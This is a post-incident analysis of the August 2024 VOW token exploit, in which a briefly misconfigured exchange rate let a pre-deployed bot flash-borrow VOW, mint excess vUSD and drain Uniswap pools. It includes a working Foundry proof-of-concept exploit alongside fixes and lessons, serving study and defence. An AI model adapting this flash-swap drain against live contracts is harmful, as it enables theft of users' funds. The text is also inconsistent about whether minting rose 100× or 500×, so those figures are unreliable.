# VOW — Misconfiguration Exploit Analysis

| Field | Details |
|------|------|
| **Date** | 2024-08-13 |
| **Protocol** | VOW (Vowcurrency) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$1,000,000 – $1,200,000 (175 ETH + 595,000 USDT + remaining VOW) |
| **Attacker** | [0x48de6b...f00c0c3](https://etherscan.io/address/0x48de6bf9e301946b0a32b053804c61dc5f00c0c3) |
| **Attack Contract** | [0xb7f221...261758](https://etherscan.io/address/0xb7f221e373e3f44409f91c233477ec2859261758) |
| **Attack Tx** | [0xb569340f...dee36b3](https://etherscan.io/tx/0xb569340f147cb6d5722490221ba65950a870aaa4db6ab835b8aa128c5dee36b3) |
| **Vulnerable Contracts** | [VOWToken 0x1BBf25...946Fb](https://etherscan.io/address/0x1bbf25e71ec48b84d773809b4ba55b6f4be946fb) / [VSCTokenManager 0x184497...46E5dC](https://etherscan.io/address/0x184497031808F2b6A2126886C712CC41f146E5dC) |
| **Attack Block** | 20,519,310 |
| **Root Cause** | Critical exchange rate parameter misconfigured in production for testing purposes (usdRate: normal [5,1] → at time of attack [1,100]) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-08/VOW_exp.sol) |

---

## 1. Vulnerability Overview

The VOW protocol is designed to mint vUSD (VSC) stablecoins by burning VOW tokens. The minting ratio is determined by the `usdRate` state variable (a 2-element array) in the VOWToken contract.

On the day of the attack, the VOW team's `usdRateSetter` address changed `usdRate` from the normal value `[5, 1]` (5 VOW per 1 vUSD) to `[1, 100]` (1 VOW per 100 vUSD) to conduct a test on mainnet. This change remained publicly visible for approximately 15–30 seconds before being reverted.

The attacker, via an automated bot contract deployed 110 days in advance, immediately detected the rate change and used a Uniswap V2 flash swap to mint approximately 148,662,500 vUSD without any capital, then drained the liquidity pools to steal approximately $1.2M.

**Core vulnerability combination:**
1. **(V-01) Production Environment Parameter Misconfiguration** — usdRate set over 100× above normal
2. **(V-02) Race Condition from Multi-Tx State Change** — non-atomic separate transactions instead of a single atomic transaction
3. **(V-03) Capital-Free Attack Amplification via Flash Loan** — Uniswap V2 flash swap utilized
4. **(V-04) Insufficient Access Control on Critical Parameter** — immediately changeable without time delay or governance

---

## 2. Vulnerable Code Analysis

### 2.1 Exchange Rate Setter Function (VOWToken.sol) — Core Vulnerability

Actual on-chain verified source code (Sourcify verified):

```solidity
// ❌ Vulnerable code — VOWToken.sol
// Access control: only validates onlyUSDRateSetter, no other protections
contract VOWToken is Token, IERC777Recipient, Owned {

    uint256[2] public usdRate;       // ❌ [numTokens, numUSD] ratio — changeable instantly
    address public usdRateSetter;    // ❌ single address holds unlimited change authority

    modifier onlyUSDRateSetter() {
        require(msg.sender == usdRateSetter, "onlyUSDRateSetter");
        _;
    }

    // ❌ Problem: no parameter range validation, no time delay, only emits event
    function setUSDRate(uint256 _numTokens, uint256 _numUSD)
        external
        onlyUSDRateSetter  // ❌ simple address check only — no governance/multisig/timelock
    {
        doSetUSDRate(_numTokens, _numUSD);
        emit LogUSDRateSet(_numTokens, _numUSD);
    }

    function doSetUSDRate(uint256 _numTokens, uint256 _numUSD)
        private
    {
        require(_numTokens != 0, "numTokens cannot be zero");  // ❌ only zero check
        require(_numUSD != 0, "numUSD cannot be zero");        // ❌ no upper bound validation
        usdRate = [_numTokens, _numUSD];  // ❌ any value applied immediately
    }
}
```

```solidity
// ✅ Fixed code — multi-layered protection applied
contract VOWToken is Token, IERC777Recipient, Owned {

    uint256[2] public usdRate;
    address public usdRateSetter;

    // ✅ Added: maximum allowed rate multiplier constant (e.g., prohibit changes over 10×)
    uint256 public constant MAX_RATE_MULTIPLIER = 10;
    // ✅ Added: timelock delay (e.g., 24 hours)
    uint256 public constant RATE_CHANGE_DELAY = 24 hours;
    uint256 public pendingRateChangeTime;
    uint256[2] public pendingUsdRate;
    bool public hasPendingRateChange;

    // ✅ Added: emergency pause functionality
    bool public paused;
    modifier whenNotPaused() {
        require(!paused, "Contract is paused");
        _;
    }

    // ✅ Schedule rate change (timelock instead of immediate application)
    function proposeUSDRate(uint256 _numTokens, uint256 _numUSD)
        external
        onlyUSDRateSetter
    {
        require(_numTokens != 0 && _numUSD != 0, "Rate cannot be zero");
        // ✅ Deviation check: within maximum 10× of current rate
        uint256 currentRatio = usdRate[1] * 1e18 / usdRate[0];
        uint256 newRatio = _numUSD * 1e18 / _numTokens;
        require(
            newRatio <= currentRatio * MAX_RATE_MULTIPLIER &&
            newRatio * MAX_RATE_MULTIPLIER >= currentRatio,
            "Rate change exceeds max multiplier"
        );
        pendingUsdRate = [_numTokens, _numUSD];
        pendingRateChangeTime = block.timestamp + RATE_CHANGE_DELAY;
        hasPendingRateChange = true;
        emit LogUSDRateProposed(_numTokens, _numUSD, pendingRateChangeTime);
    }

    // ✅ Applicable only after timelock expires
    function applyPendingUSDRate() external onlyUSDRateSetter {
        require(hasPendingRateChange, "No pending rate change");
        require(block.timestamp >= pendingRateChangeTime, "Timelock not expired");
        usdRate = pendingUsdRate;
        hasPendingRateChange = false;
        emit LogUSDRateSet(pendingUsdRate[0], pendingUsdRate[1]);
    }
}
```

**Issue**: The `setUSDRate` function has absolutely no parameter range validation, allowing any arbitrary value to be set instantly. Furthermore, the structure requires a separate Tx to revert after an on-chain state change, creating an attack window between the change and the revert.

---

### 2.2 VOW → vUSD Minting Calculation (VSCTokenManager.sol)

```solidity
// ❌ Vulnerable code — VSCTokenManager.sol
// Actual Sourcify-verified source

function getVOWVSCRate()
    public
    view
    returns (uint256 numVOW_, uint256 numVSC_)
{
    VSCToken vscToken = VSCToken(token);
    VOWToken vowToken = VOWToken(vowContract);
    // ❌ Reads VOW token's usdRate in real time — manipulated value is reflected immediately
    numVOW_ = vowToken.usdRate(0).mul(vscToken.usdRate(1));
    numVSC_ = vowToken.usdRate(1).mul(vscToken.usdRate(0));
}

function tokensReceivedVOW(address _from, bytes memory _data, uint256 _amount)
    private
{
    VOWToken(vowContract).burn(_amount, "");
    (uint256 numVOW, uint256 numVSC) = getVOWVSCRate();
    // ❌ With usdRate=[1,100]: vscAmount = _amount * 100 / 1 = 100× mint
    uint256 vscAmount = _amount.mul(numVSC).div(numVOW);
    VSCToken(token).mint(_from, vscAmount);  // ❌ 100× vUSD minted
    emit LogBurnAndMint(_from, _amount, vscAmount);
}
```

```solidity
// ✅ Fixed code — add TWAP or upper bound
function tokensReceivedVOW(address _from, bytes memory _data, uint256 _amount)
    private
{
    VOWToken(vowContract).burn(_amount, "");
    (uint256 numVOW, uint256 numVSC) = getVOWVSCRate();

    // ✅ Ratio sanity check: cap maximum mint amount
    uint256 vscAmount = _amount.mul(numVSC).div(numVOW);
    require(
        vscAmount <= _amount.mul(MAX_MINT_RATIO),  // ✅ upper bound on max mint multiplier
        "Mint amount exceeds safety limit"
    );

    VSCToken(token).mint(_from, vscAmount);
    emit LogBurnAndMint(_from, _amount, vscAmount);
}
```

**Issue**: `getVOWVSCRate()` reads the VOW token's `usdRate` in real time; when this value is set to `[1, 100]`, 1 VOW can mint 100 vUSD.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- **T-110 days**: Attacker (0x48de6b...) deploys automated attack contract (0xb7f221...) on mainnet and begins mempool/event monitoring
- **Pre-approve**: Attack contract calls `approve(this, type(uint256).max)` to handle the attacker EOA's VOW and vUSD
- **Immediately before attack**: VOW team's usdRateSetter (0xbA1be907...) calls VOWToken.setUSDRate, changing `usdRate = [1, 100]` (normal value: [5, 1])

### 3.2 Execution Phase

1. **[Step 1] Initiate Uniswap V2 Flash Swap**
   - `VOW_WETH_Pair.swap(vowBalance-1, 0, address(this), hex"00")`
   - Borrows the entire available VOW (~1,486,625 VOW) from the VOW-WETH pool for free
   - Fund flow: VOW-WETH pool → attack contract

2. **[Step 2] uniswapV2Call callback — Burn VOW → Mint 100× excess vUSD**
   - Attack contract transfers borrowed VOW to attacker EOA
   - Attacker EOA → transfers VOW to VSCTokenManager (triggers `tokensReceived` hook)
   - VSCTokenManager: mints **148,662,500 vUSD** from 1,486,625 VOW using `usdRate=[1,100]`
   - (Normal would be: 1,486,625 VOW × (1/5) ≈ 297,325 vUSD)
   - Excess minted vUSD recovered from attacker EOA → attack contract

3. **[Step 3] Swap vUSD → VOW (drain vUSD-VOW pool)**
   - Inject 148,662,500 vUSD into vUSD_VOW_Pair
   - Acquire large amount of VOW from vUSD-VOW pool (nearly all pool liquidity drained)
   - Fund flow: vUSD-VOW pool → attack contract (large amount of VOW)

4. **[Step 4] Repay Flash Loan + Realize VOW → ETH**
   - Repay flash loan: return borrowed VOW + fee (0.3%)
   - Inject half of surplus VOW into VOW_WETH_Pair → acquire WETH
   - Unwrap WETH → ETH and transfer to attacker EOA

5. **[Step 5] Realize remaining VOW → USDT**
   - Inject remaining VOW into VOW_USDT_Pair → acquire USDT
   - Transfer USDT to attacker EOA

### 3.3 Attack Flow Diagram

```
[Attacker EOA — 0x48de6b...]
    │  T-110 days: deploy attack contract and wait
    │  approve(attackContract, VOW/vUSD, max)
    ▼
┌──────────────────────────────────────┐
│  Attack Contract (0xb7f221e3...)     │
│  (automated bot, monitors rate change)│
└───────────────┬──────────────────────┘
                │  Step 1: swap(vowBalance-1, 0, this, "0x00")
                ▼
┌──────────────────────────────────────┐
│  VOW-WETH Uniswap V2 Pool           │
│  (0x7FdEB46b...)                    │
│  → Execute flash swap of 1,486,625 VOW│
└───────────────┬──────────────────────┘
                │  uniswapV2Call callback
                ▼
┌──────────────────────────────────────┐
│  Attack Contract (callback handling) │
│  Step 2a: 1,486,625 VOW             │
│           → forward to attacker EOA  │
└───────────────┬──────────────────────┘
                │  transferFrom(attacker → vscTokenManager)
                ▼
┌──────────────────────────────────────┐     usdRate = [1, 100]
│  VSCTokenManager (0x184497...)       │  ← ❌ Misconfigured rate applied!
│  tokensReceived → burn(1,486,625 VOW)│
│  1 VOW × 100 = 100 vUSD             │
│  → Mint 148,662,500 vUSD            │
└───────────────┬──────────────────────┘
                │  Step 3: inject 148,662,500 vUSD → pool
                ▼
┌──────────────────────────────────────┐
│  vUSD-VOW Uniswap V2 Pool           │
│  (0x97BE09f2...)                    │
│  → Drain most of pool's VOW liquidity│
└───────────────┬──────────────────────┘
                │  Acquire large VOW then repay flash loan
                ▼
┌──────────────────────────────────────────────────────────────┐
│  Step 4: surplus VOW/2 → VOW_WETH_Pair → WETH → unwrap ETH  │
│  Step 5: remaining surplus VOW → VOW_USDT_Pair → acquire USDT│
└──────────────────────────┬───────────────────────────────────┘
                           │
                           ▼
               ┌────────────────────────┐
               │  Attacker EOA Final    │
               │  Receipt               │
               │  ~175 ETH (~$452K)     │
               │  ~595,000 USDT         │
               │  Remaining VOW tokens  │
               │  Total: ~$1.2M         │
               └────────────────────────┘
```

### 3.4 Outcome

- **Attacker profit**: ~175 ETH (~$452,000) + ~595,000 USDT + remaining VOW tokens
- **Total protocol loss**: ~$1,000,000 – $1,200,000
- **VOW token price**: ~80% crash after the attack
- **Attack duration**: Completed within a ~15–30 second vulnerability window inside a single transaction

---

## 4. PoC Code (Key Excerpt from DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// @KeyInfo
// Total Lost: ~1M USD
// Attacker: 0x48de6bf9e301946b0a32b053804c61dc5f00c0c3
// Attack Tx: 0xb569340f147cb6d5722490221ba65950a870aaa4db6ab835b8aa128c5dee36b3
// Attack Block: 20,519,309 (fork base: 20,519,308)

contract VOW is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 20_519_309 - 1;

    // Related contract address definitions
    address private constant VOW_WETH_Pair   = 0x7FdEB46b3a0916630f36E886D675602b1007Fcbb;
    address private constant vUSD_VOW_Pair   = 0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb;
    address private constant VOW_USDT_Pair   = 0x1E49768714E438E789047f48FD386686a5707db2;
    address private constant vscTokenManager = 0x184497031808F2b6A2126886C712CC41f146E5dC;
    address private constant vow             = 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb;
    address private constant vUSD            = 0x0fc6C0465C9739d4a42dAca22eB3b2CB0Eb9937A;
    address private constant attacker        = 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3;

    function setUp() public {
        // Fork to just before the attack block (state where usdRate=[1,100] is set)
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        // Pre-configure unlimited approve from attacker EOA to attack contract
        vm.startPrank(attacker);
        IERC20(vow).approve(address(this), type(uint256).max);
        IERC20(vUSD).approve(address(this), type(uint256).max);
        vm.stopPrank();
    }

    function testExploit() public balanceLog {
        // [Step 1] Flash swap to borrow all VOW from VOW-WETH pool
        // Pass hex"00" data to trigger uniswapV2Call callback
        uint256 vowBalance = IERC20(vow).balanceOf(VOW_WETH_Pair);
        Uni_Pair_V2(VOW_WETH_Pair).swap(vowBalance - 1, 0, address(this), hex"00");

        // [Step 4] Swap 1/2 of remaining VOW after callback to WETH
        vowBalance = IERC20(vow).balanceOf(address(this));
        IERC20(vow).transfer(attacker, vowBalance / 10);  // keep 10% at EOA
        (uint112 reserve0, uint112 reserve1,) = Uni_Pair_V2(VOW_WETH_Pair).getReserves();
        vowBalance = IERC20(vow).balanceOf(address(this));
        IERC20(vow).transfer(VOW_WETH_Pair, vowBalance / 2);
        uint256 amount0In = IERC20(vow).balanceOf(VOW_WETH_Pair) - reserve0;
        uint256 amount1Out = getAmount1Out(reserve0, reserve1, amount0In);
        Uni_Pair_V2(VOW_WETH_Pair).swap(0, amount1Out, address(this), hex"");
        IWETH(payable(weth)).withdraw(amount1Out);
        (bool success,) = attacker.call{value: amount1Out}("");

        // [Step 5] Swap all remaining VOW to USDT
        (reserve0, reserve1,) = Uni_Pair_V2(VOW_USDT_Pair).getReserves();
        IERC20(vow).transfer(VOW_USDT_Pair, IERC20(vow).balanceOf(address(this)));
        amount0In = IERC20(vow).balanceOf(VOW_USDT_Pair) - reserve0;
        amount1Out = getAmount1Out(reserve0, reserve1, amount0In);
        Uni_Pair_V2(VOW_USDT_Pair).swap(0, amount1Out, address(this), hex"");
        usdt.call(abi.encodeWithSignature("transfer(address,uint256)", attacker, IERC20(usdt).balanceOf(address(this))));
    }

    // [Step 2+3] Flash swap callback — core exploit logic
    function uniswapV2Call(address sender, uint256 amount0, uint256, bytes calldata) external {
        require(msg.sender == VOW_WETH_Pair, "not from pool");

        // [Step 2] Transfer borrowed VOW to attacker EOA, then
        // forward on behalf of attacker to VSCTokenManager (triggers tokensReceived hook)
        IERC20(vow).transfer(attacker, amount0);
        IERC20(vow).transferFrom(attacker, vscTokenManager, amount0);
        // → Under usdRate=[1,100] condition: amount0 * 100 vUSD minted (100× excess mint!)

        // [Step 3] Inject excess minted vUSD into vUSD-VOW pool to acquire additional VOW
        uint256 vUSDBalance = IERC20(vUSD).balanceOf(attacker);
        IERC20(vUSD).transferFrom(attacker, address(this), vUSDBalance);
        (uint112 reserve0, uint112 reserve1,) = Uni_Pair_V2(vUSD_VOW_Pair).getReserves();
        IERC20(vUSD).transfer(vUSD_VOW_Pair, vUSDBalance);
        uint256 amount0In = IERC20(vUSD).balanceOf(vUSD_VOW_Pair) - reserve0;
        uint256 amount1Out = getAmount1Out(reserve0, reserve1, amount0In);
        Uni_Pair_V2(vUSD_VOW_Pair).swap(0, amount1Out, address(this), hex"");

        // Repay flash loan (borrowed amount + 0.3% fee)
        uint256 fee = amount0 * 3 / 997 + 1000;
        IERC20(vow).transfer(VOW_WETH_Pair, amount0 + fee);
    }

    // Uniswap V2 formula: amountOut = reserve1 * 997 * amountIn / (1000 * reserve0 + 997 * amountIn)
    function getAmount1Out(uint112 reserve0, uint112 reserve1, uint256 amount0In) private pure returns (uint256) {
        return reserve1 * 997 * amount0In / (1000 * reserve0 + 997 * amount0In);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Production environment parameter misconfiguration (usdRate set over 100× above normal) | CRITICAL | CWE-16 (Configuration) |
| V-02 | Race condition from multi-Tx state change (front-runnable) | CRITICAL | CWE-362 (Race Condition) |
| V-03 | Capital-free attack amplification via flash loan | HIGH | CWE-682 (Incorrect Calculation) |
| V-04 | Insufficient access control on critical parameter (no timelock/multisig) | HIGH | CWE-284 (Improper Access Control) |

### V-01: Production Environment Parameter Misconfiguration (CWE-16)

- **Description**: The VOW team directly changed `usdRate` on the mainnet contract from the normal value `[5, 1]` to `[1, 100]` to test vUSD minting for a new lending pool and oracle feature. The normal ratio confirmed on-chain was 5 VOW = 1 USD, but at the time of the attack, 1 VOW = 100 USD was applied.
- **Impact**: 500× (100/0.2) vUSD minted per VOW compared to normal. 1,486,625 VOW yielded 148,662,500 vUSD.
- **Attack condition**: `usdRate` set to an abnormally high value

### V-02: Race Condition from Multi-Tx State Change (CWE-362)

- **Description**: The team executed "change usdRate (Tx1) → test (Tx2) → revert (Tx3)" as separate transactions. From the moment Tx1 completes until Tx3 executes, there is an ~15–30 second attack window. An automated bot deployed 110 days in advance detected and exploited this instantly.
- **Impact**: Vulnerable to automated MEV/bot attacks no matter how short the window
- **Attack condition**: Attack contract pre-deployed and waiting + mempool monitoring active

### V-03: Attack Amplification via Flash Loan (CWE-682)

- **Description**: The attacker borrowed a large amount of VOW via Uniswap V2 flash swap without any capital of their own. Without the rate manipulation state, the flash loan alone could not have generated profit.
- **Impact**: Large-scale arbitrage achievable without capital (leveraged amplification)
- **Attack condition**: V-01 prerequisite required (rate manipulation state) + sufficient pool liquidity

### V-04: Insufficient Access Control on Critical Parameter (CWE-284)

- **Description**: The `setUSDRate` function only performs a single `onlyUSDRateSetter` address check. No additional protections such as timelock, multisig, governance vote, or deviation limits. Validation inside `doSetUSDRate` only checks for zero.
- **Impact**: If the single address key is compromised or misused, the entire protocol's assets are at risk
- **Attack condition**: Mistake or malicious action by the party holding usdRateSetter privileges

---

## 6. Remediation Recommendations

### Immediate Actions

#### 6.1 Parameter Deviation Limit

```solidity
// ✅ Fix: add deviation upper bound to setUSDRate
function setUSDRate(uint256 _numTokens, uint256 _numUSD)
    external
    onlyUSDRateSetter
{
    // Only allow changes within N× of the current ratio
    uint256 currentRate = usdRate[1] * 1e18 / usdRate[0];  // current USD/Token ratio
    uint256 newRate = _numUSD * 1e18 / _numTokens;

    require(
        newRate <= currentRate * 10 &&   // prohibit more than 10× increase
        newRate * 10 >= currentRate,     // prohibit more than 1/10 decrease
        "Rate change exceeds allowed range"
    );
    doSetUSDRate(_numTokens, _numUSD);
    emit LogUSDRateSet(_numTokens, _numUSD);
}
```

#### 6.2 Timelock Implementation

```solidity
// ✅ Fix: apply minimum 24-hour timelock to rate changes
uint256 public constant RATE_CHANGE_TIMELOCK = 24 hours;
uint256 public pendingRateChangeTime;
uint256[2] public pendingRate;

function proposeUSDRate(uint256 _numTokens, uint256 _numUSD) external onlyUSDRateSetter {
    pendingRate = [_numTokens, _numUSD];
    pendingRateChangeTime = block.timestamp + RATE_CHANGE_TIMELOCK;
    emit LogUSDRateProposed(_numTokens, _numUSD, pendingRateChangeTime);
}

function executeUSDRate() external onlyUSDRateSetter {
    require(block.timestamp >= pendingRateChangeTime, "Timelock active");
    usdRate = pendingRate;
    emit LogUSDRateSet(pendingRate[0], pendingRate[1]);
}
```

#### 6.3 Emergency Pause

```solidity
// ✅ Fix: add emergency pause modifier
bool public emergencyPaused;

modifier whenNotEmergencyPaused() {
    require(!emergencyPaused, "Protocol emergency paused");
    _;
}

// Apply whenNotEmergencyPaused to critical functions such as tokensReceivedVOW, burn
function tokensReceivedVOW(address _from, bytes memory _data, uint256 _amount)
    private
    whenNotEmergencyPaused  // ✅ added
{
    // ...existing logic...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Production testing | **Never test directly on mainnet**. Use testnet (Goerli/Sepolia) or a fork environment |
| V-02 Multi-Tx changes | Execute state change and revert atomically in a single Tx via `multicall` |
| V-03 Flash loan amplification | Apply a per-block mint cap (`perBlockMintLimit`) in VSCTokenManager |
| V-04 Access control | Replace `usdRateSetter` with a 2-of-3 multisig + 48-hour timelock contract |
| Lack of monitoring | Set up real-time alerts for abnormal mint volumes via on-chain monitoring (Chainalysis/Forta) |
| Economic model risk | Mandate simulation of the impact on total protocol TVL upon rate changes |

---

## 7. Lessons Learned

1. **Mainnet is a production environment**: No matter how brief, changing critical parameters on mainnet for testing is fatal. Tests must always be performed on a testnet or a local fork.

2. **State changes must be atomic**: Do not split "change → test → revert" into separate transactions — execute them as a single transaction via `multicall`. Every state between transaction boundaries is exposed to attackers.

3. **Critical parameters must be protected with timelock + multisig**: Exchange rate/ratio parameters that affect token minting must be enforced with a timelock (minimum 24–48 hours) and multisig to prevent immediate changes.

4. **Automated bots respond instantly**: This attacker deployed a contract 110 days in advance and waited. On-chain event monitoring automatically detects attack windows. Human reaction speed is slower than bots.

5. **Parameter range validation is mandatory**: A structure where `setUSDRate` accepts any value other than zero is dangerous. Always enforce a deviation upper bound relative to the current value at the code level.

6. **Misconfiguration produces the same result as a malicious attack**: This incident was not an external hacker directly attacking the protocol's code, but an automated bot exploiting a team mistake (incorrect parameter configuration). Operational errors are just as dangerous as code vulnerabilities.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Data Comparison

| Field | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Attack block | 20,519,309 | 20,519,310 | ✅ (fork +1) |
| Attacker EOA | 0x48de6b... | 0x48de6bf9e301946b0a32b053804c61dc5f00c0c3 | ✅ |
| Attack contract | (this) | 0xb7f221e373e3f44409f91c233477ec2859261758 | ✅ |
| Transaction target (to) | attack contract | 0xb7f221e373e3f44409f91c233477ec2859261758 | ✅ |
| usdRate (normal) | [5, 1] (estimated) | [5, 1] (as of block 20,519,200) | ✅ |
| usdRate (at attack) | [1, 100] (estimated) | [1, 100] (measured at block 20,519,309) | ✅ |
| Tx Status | Success | 0x1 (success) | ✅ |
| Gas Used | - | 521,052 (0x7f75c) | - |
| Event log count | - | 39 | - |

### 8.2 On-Chain Event Log Order (Top 10)

| Order | Topic0 | Contract | Estimated Event |
|------|--------|---------|------------|
| 1 | 0x06b541dd... | VOWToken (0x1bbf25e7) | Sent (ERC777) |
| 2 | 0xddf252ad... | VOWToken (0x1bbf25e7) | Transfer (VOW transfer) |
| 3 | 0x06b541dd... | VOWToken (0x1bbf25e7) | Sent (ERC777) |
| 4 | 0xddf252ad... | VOWToken (0x1bbf25e7) | Transfer (VOW transfer) |
| 5 | 0x06b541dd... | VOWToken (0x1bbf25e7) | Sent (ERC777) |
| 6 | 0xddf252ad... | VOWToken (0x1bbf25e7) | Transfer (VOW burn) |
| 7 | 0xa78a9be3... | VOWToken (0x1bbf25e7) | Burned (ERC777 burn) |
| 8 | 0xddf252ad... | VOWToken (0x1bbf25e7) | Transfer |
| 9 | 0x2fe5be01... | vUSD (0x0fc6c046) | Minted (vUSD mint) |
| 10 | 0xddf252ad... | vUSD (0x0fc6c046) | Transfer (vUSD transfer) |

→ vUSD Minted event confirmed immediately after VOW ERC777 Burned: burn→mint mechanism verified

### 8.3 Precondition Verification (as of block 20,519,200)

| Field | Value | Notes |
|------|-----|------|
| usdRate[0] (numTokens) | 5 | Normal state: 5 VOW = 1 USD |
| usdRate[1] (numUSD) | 1 | Normal state: 5 VOW = 1 USD |
| usdRate[0] (at attack, block 20,519,309) | 1 | Abnormal: 1 VOW = 100 USD |
| usdRate[1] (at attack, block 20,519,309) | 100 | Abnormal: 1 VOW = 100 USD |
| Rate change magnitude | 5→0.01 (numTokens/numUSD) | **500× increase in mint amount** |

**Conclusion**: On-chain verification confirms that the PoC analysis results match exactly. The change from the normal `usdRate=[5,1]` to `[1,100]` is confirmed to be a critical configuration error that amplifies vUSD minting by 500×.

---

## References

- [Halborn — Explained: The Vow Hack (August 2024)](https://www.halborn.com/blog/post/explained-the-vow-hack-august-2024)
- [CertiK — Vow Incident Analysis](https://www.certik.com/resources/blog/vow-incident-analysis)
- [QuillAudits — Decoding Vowcurrency's $1.2 Million Exploit](https://www.quillaudits.com/blog/hack-analysis/vowcurrency-hack)
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-08/VOW_exp.sol)
- [Etherscan — Attack Transaction](https://etherscan.io/tx/0xb569340f147cb6d5722490221ba65950a870aaa4db6ab835b8aa128c5dee36b3)
- [Sourcify — VOWToken.sol](https://repo.sourcify.dev/contracts/full_match/1/0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb)
- [Sourcify — VSCTokenManager.sol](https://repo.sourcify.dev/contracts/full_match/1/0x184497031808F2b6A2126886C712CC41f146E5dC)